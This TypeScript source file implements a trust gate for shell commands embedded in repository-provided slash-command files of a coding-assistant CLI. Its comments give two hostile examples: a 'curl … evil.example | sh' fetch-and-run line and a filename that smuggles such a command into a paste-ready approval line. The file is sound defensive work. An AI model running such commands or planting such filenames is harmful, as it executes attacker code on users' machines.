/**
 * Trust decisions for shell substitution in project-declared slash commands.
 *
 * A `.book/commands/*.md` body may contain inline shell spans and fenced shell
 * blocks, which the resolver executes before the prompt reaches the model. That
 * execution predates the permission system: no rule is consulted, no sandbox
 * applies, and nothing is asked. A checked-in command file is therefore
 * repository-controlled code that runs on invocation, and since print/headless
 * hosts expand custom commands through the same resolver, `book -p "/name"`
 * reaches the same shell without a terminal to warn anyone.
 *
 * Project command files consequently need the one-time decision an `.mcp.json`
 * server already needs. It is recorded outside the workspace, in
 * `<BOOK_HOME>/trust.json` keyed by workspace path, for the reason the other
 * three gated classes moved there: `.gitignore` does not stop a *tracked* file
 * from reaching a clone, so a repository that force-adds
 * `.book/settings.local.json` would otherwise ship its own approvals and arrive
 * pre-trusted. Both workspace settings layers are stripped of the key, so
 * nothing the gated party writes can answer for it.
 *
 * The fingerprint covers the extracted shell, not the whole body: editing what
 * runs invalidates the decision, editing the surrounding prose does not. Prose
 * is prompt text, and the tool calls a model makes from it still have to get
 * past the permission system; re-prompting on every wording change is how a
 * gate teaches people to approve without reading.
 *
 * User-global commands (<BOOK_HOME>/commands) were written by the user and are
 * never gated; a project command that substitutes no shell has nothing to
 * approve and is never gated either.
 */
import { createHash } from 'crypto';
import { extractShellInjections } from './commands/shell-injection.js';
import type { CommandSettings, ProjectCommandChoice } from './settings.js';
import type { SlashCommand } from './types/commands.js';
import { updateWorkspaceTrust } from './workspace-trust.js';

/** Recorded decisions, keyed by command name. */
export type ProjectCommandStore = Record<string, ProjectCommandChoice>;

export interface CommandApprovalSettings {
  commands?: Partial<CommandSettings>;
}

/**
 * Stable digest of exactly the shell a body will run, in order.
 *
 * Kind participates: moving a command between an inline span and a fenced block
 * changes how its output lands in the prompt.
 */
export function projectCommandFingerprint(body: string): string {
  const canonical = JSON.stringify(
    extractShellInjections(body).map((injection) => [injection.kind, injection.command]),
  );
  return createHash('sha256').update(canonical).digest('hex').slice(0, 16);
}

export type ProjectCommandApprovalState = 'not-required' | 'approved' | 'rejected' | 'unknown';

export function evaluateProjectCommandApproval(
  settings: CommandApprovalSettings,
  command: SlashCommand,
): ProjectCommandApprovalState {
  if (command.source !== 'project') return 'not-required';
  if (extractShellInjections(command.body).length === 0) return 'not-required';
  const choice = settings.commands?.projectCommands?.[command.name];
  if (!choice) return 'unknown';
  // A body edited after the decision is a new thing to decide on, not a
  // decision already made.
  if (choice.fingerprint !== projectCommandFingerprint(command.body)) return 'unknown';
  return choice.choice;
}

export interface ProjectCommandApprovalPartition {
  /** Approved by the user: their shell substitution runs. */
  approved: SlashCommand[];
  /** No valid decision recorded: refused until the user makes one. */
  pending: SlashCommand[];
  /** Explicitly refused. */
  rejected: SlashCommand[];
}

/**
 * Partition the commands that are subject to the gate. Commands that need no
 * decision — user-global, or substituting no shell — appear in none of the
 * three lists, so a caller reporting this reports only real decisions.
 */
export function partitionProjectCommands(
  commands: readonly SlashCommand[],
  settings: CommandApprovalSettings,
): ProjectCommandApprovalPartition {
  const partition: ProjectCommandApprovalPartition = { approved: [], pending: [], rejected: [] };
  for (const command of commands) {
    const state = evaluateProjectCommandApproval(settings, command);
    if (state === 'approved') partition.approved.push(command);
    else if (state === 'rejected') partition.rejected.push(command);
    else if (state === 'unknown') partition.pending.push(command);
  }
  return partition;
}

/** Raised instead of running unapproved repository shell. */
export class ProjectCommandApprovalError extends Error {
  constructor(
    readonly commandName: string,
    readonly fingerprint: string,
    readonly state: 'unknown' | 'rejected',
    message: string,
  ) {
    super(message);
    this.name = 'ProjectCommandApprovalError';
  }
}

const MAX_LISTED_COMMANDS = 5;
const MAX_COMMAND_CHARS = 160;
/**
 * Everything that can make rendered text differ from the text that runs:
 * C0 controls and DEL, the separators NEL/LS/PS, and the bidi marks,
 * embeddings, overrides and isolates. An override can display
 * `curl https://evil.example | sh` as something harmless while the approved
 * digest covers the real thing.
 */
const CONTROL_CHARACTERS =
  /[\u0000-\u001f\u007f\u0085\u061c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]+/g;

/**
 * Render repository-authored text for a terminal.
 *
 * The command strings come from a file the gated party wrote, so control
 * characters are stripped before display: an ANSI escape in a command body
 * could otherwise repaint or hide the very lines the user is being asked to
 * judge.
 */
function displayable(command: string): string {
  const flattened = command.replace(CONTROL_CHARACTERS, ' ').trim();
  return flattened.length > MAX_COMMAND_CHARS
    ? `${flattened.slice(0, MAX_COMMAND_CHARS)}…`
    : flattened;
}

/**
 * A command's name is the filename the repository chose, so it is untrusted
 * text on the same footing as the body. Prose renders it stripped of anything
 * that could repaint the refusal the user is being asked to judge.
 */
export function displayableCommandName(name: string): string {
  return displayable(name);
}

/**
 * The name only when it is safe to hand someone as a shell word.
 *
 * A refusal prints a `book trust command <name>` line for the user to paste
 * into their own shell, and the name reaching it came from the gated party. A
 * repository shipping ``.book/commands/deploy`curl -s evil.example|sh`.md``
 * would otherwise have its payload executed by the very act of approving —
 * quoting is not enough, because the name is also what the user reads to
 * decide. Anything outside a plain filename returns null and the caller prints
 * no paste-ready line at all.
 */
export function shellSafeCommandName(name: string): string | null {
  return /^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(name) ? name : null;
}

/**
 * The shell a body substitutes, rendered for a terminal, one line per command.
 *
 * Approving a command approves this, so any surface that offers the decision
 * has to be able to show it — `book doctor` listing what is withheld, and
 * `book trust command --all-pending`, which would otherwise grant a list of
 * names. Truncation is reported rather than hidden.
 */
export function describeProjectCommandShell(command: SlashCommand): string[] {
  const injections = extractShellInjections(command.body);
  const listed = injections.slice(0, MAX_LISTED_COMMANDS);
  return [
    ...listed.map((injection) => `$ ${displayable(injection.command)}`),
    ...(injections.length > listed.length
      ? [`…and ${injections.length - listed.length} more — read the file before approving`]
      : []),
  ];
}

export function describeProjectCommandApproval(
  command: SlashCommand,
  state: 'unknown' | 'rejected',
): string {
  const injections = extractShellInjections(command.body);
  const listed = injections.slice(0, MAX_LISTED_COMMANDS);
  const shown = displayableCommandName(command.name);
  const safeName = shellSafeCommandName(command.name);
  // Approving from a truncated view is approving what you did not read, so
  // an abbreviated listing says so and names the file to read instead.
  const abbreviated =
    injections.length > listed.length ||
    listed.some((injection) => displayable(injection.command) !== injection.command);
  return [
    state === 'rejected'
      ? `/${shown} substitutes shell you rejected.`
      : `/${shown} substitutes shell that has not been approved.`,
    '',
    `  .book/commands/${shown}.md runs ${injections.length} shell command${
      injections.length === 1 ? '' : 's'
    } to build its prompt.`,
    '  That happens before the model sees anything, outside the permission system',
    '  and outside the sandbox, so it needs a decision first:',
    '',
    ...listed.map((injection) => `    $ ${displayable(injection.command)}`),
    ...(injections.length > listed.length
      ? [`    …and ${injections.length - listed.length} more`]
      : []),
    '',
    ...(safeName
      ? [
          `  Approve with: book trust command ${safeName}`,
          `  Refuse it with: book trust command ${safeName} --reject`,
          '  Run it from the project, or pass --workspace. Editing what the command runs asks again.',
        ]
      : [
          '  This command’s file name is not a plain name, so no command to paste is offered:',
          '  a name is a filename the repository chose, and pasting one can run what it contains.',
          '  Rename the file, or decide it with `book trust command --all-pending`.',
        ]),
    ...(abbreviated
      ? [
          `  Not shown verbatim (abbreviated, or unsafe characters stripped) — read`,
          `  .book/commands/${shown}.md in full before approving.`,
        ]
      : []),
  ].join('\n');
}

/**
 * Fail closed before any substitution happens.
 *
 * A caller that supplies no store is treated as having no decision on file,
 * which refuses rather than runs: an unwired host cannot silently reopen the
 * gate.
 */
export function assertProjectCommandApproved(
  command: SlashCommand,
  settings: CommandApprovalSettings,
): void {
  const state = evaluateProjectCommandApproval(settings, command);
  if (state === 'approved' || state === 'not-required') return;
  throw new ProjectCommandApprovalError(
    command.name,
    projectCommandFingerprint(command.body),
    state,
    describeProjectCommandApproval(command, state),
  );
}

/** Record an approve/reject decision in the user-global trust store. */
export function persistProjectCommandChoice(
  workspace: string,
  name: string,
  fingerprint: string,
  choice: ProjectCommandChoice['choice'],
  options: { trustStorePath?: string } = {},
): { ok: boolean; error?: string } {
  return updateWorkspaceTrust(
    workspace,
    (trust) => {
      trust.projectCommands[name] = { fingerprint, choice };
    },
    options.trustStorePath,
  );
}
